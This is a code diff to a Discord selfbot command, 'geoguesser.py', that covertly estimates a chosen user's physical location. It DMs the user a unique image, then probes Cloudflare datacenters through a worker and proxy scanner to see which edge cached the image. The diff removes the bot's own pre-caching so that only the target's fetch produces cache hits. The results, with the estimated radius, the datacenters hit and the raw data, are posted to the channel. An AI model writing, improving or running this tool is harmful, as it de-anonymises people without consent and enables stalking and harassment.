@@ -1,8 +1,8 @@
 """
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
-pre‑caches it, then uses Cloudflare cache enumeration
-from the ORD worker AND internal proxy scanner to estimate location.
+then uses Cloudflare cache enumeration from the ORD worker
+AND internal proxy scanner to estimate location.
 Shows a live progress bar with animated spinner.
 Works with user accounts (no embeds).
 """
@@ -173,7 +173,7 @@ async def run(client, message, args):
         "Generate unique image",
         "Upload to Discord CDN",
         "Send image to target",
-        f"Wait {WAIT_SECONDS}s for cache",
+        f"Wait {WAIT_SECONDS}s for target to load image",
         "Enumerate cache (ORD + proxies)"
     ]
 
@@ -203,15 +203,12 @@ async def run(client, message, args):
         try:
             if status_msg is None:
                 status_msg = await message.channel.send(text)
-                print(f"[GeoGuesser] Created progress message: {status_msg.id}")
             else:
                 await status_msg.edit(content=text)
-                print(f"[GeoGuesser] Edited progress message: {status_msg.id}")
         except discord.NotFound:
-            print("[GeoGuesser] Progress message not found, creating new one.")
             status_msg = await message.channel.send(text)
         except Exception as e:
-            print(f"[GeoGuesser] Failed to update progress: {e}")
+            print(f"[GeoGuesser] Progress update failed: {e}")
 
     try:
         # Step 0: Initialize
@@ -238,15 +235,6 @@ async def run(client, message, args):
             await message.channel.send(f"❌ Failed to upload image: {e}")
             return
 
-        # Pre-cache (optional)
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(image_url, timeout=10) as resp:
-                    if resp.status == 200:
-                        await resp.read()
-        except Exception:
-            pass
-
         # Step 3: DM image to target
         await _update_progress(2, extra=["📤 Sending DM..."])
         img_bytes.seek(0)
@@ -260,19 +248,19 @@ async def run(client, message, args):
             await message.channel.send(f"❌ DM failed: {e}")
             return
 
-        # Step 4: Wait with animated spinner
+        # Step 4: Wait with animated spinner (no pre-caching!)
         spinner_chars = ["o", "0"]
         spinner_index = 0
         wait_remaining = WAIT_SECONDS
         while wait_remaining > 0:
-            extra = [f"⏳ {wait_remaining} seconds remaining..."]
+            extra = [f"⏳ {wait_remaining} seconds remaining...", "❗ Do not open the image yet!"]
             await _update_progress(3, extra=extra, spinner_char=spinner_chars[spinner_index])
             spinner_index = (spinner_index + 1) % 2
             await asyncio.sleep(1)
             wait_remaining -= 1
-        await _update_progress(4, extra=["✅ Wait complete."], spinner_char="o")
+        await _update_progress(4, extra=["✅ Wait complete. Scanning caches..."], spinner_char="o")
 
-        # Step 5: Enumerate cache
+        # Step 5: Enumerate cache (both sources)
         api_ord = f"{WORKER_ORD}?url={image_url}"
 
         async def fetch_ord():
@@ -311,14 +299,13 @@ async def run(client, message, args):
 
         # Build final text message
         lines = []
-        lines.append("**📍 GeoGuesser – Combined Location Estimate**")
+        lines.append("**📍 GeoGuesser – Location Estimate**")
         lines.append(f"**Target:** {target.name}")
         lines.append(f"**Image URL:** {image_url}")
         lines.append("**Sources:** ORD worker + proxy scanner")
-        lines.append("**Pre-cached:** ✅")
         lines.append(f"**Datacenters with HIT:** {len(datacenters)}")
         if not datacenters:
-            lines.append("**Estimated radius:** N/A")
+            lines.append("**Estimated radius:** N/A (no cache hits)")
         else:
             coords = []
             colo_names = []
@@ -341,8 +328,8 @@ async def run(client, message, args):
                 lines.append(f"**🌐 HIT Datacenters:** {', '.join(datacenters)}")
 
         lines.append(f"**📊 Scan Stats:** Checked: {checked} / Hits: {hits}")
-        lines.append(f"**🔬 Scanned Colos:**")
-        # Add colos list (compact)
+
+        # Scanned colos
         probed_colos = []
         seen = set()
         for r in full_results:
@@ -353,13 +340,14 @@ async def run(client, message, args):
         colos_text = "\n".join(probed_colos[:12]) if probed_colos else "Unknown"
         if len(probed_colos) > 12:
             colos_text += f"\n... and {len(probed_colos)-12} more"
+        lines.append(f"**🔬 Scanned Colos:**")
         lines.append(f"```\n{colos_text}\n```")
         lines.append(f"**📄 Raw Merged Data:**")
         lines.append(f"```json\n{raw_json}\n```")
 
         final_text = "\n".join(lines)
 
-        # Update progress to done, then delete progress message and send final
+        # All done
         await _update_progress(total_steps, extra=["✅ All done. See results below."])
         try:
             await status_msg.delete()
@@ -369,8 +357,7 @@ async def run(client, message, args):
 
     except Exception as e:
         traceback.print_exc()
-        error_msg = f"⚠️ Unexpected error: {e}"
         try:
-            await message.channel.send(error_msg)
+            await message.channel.send(f"⚠️ Unexpected error: {e}")
         except Exception:
             pass
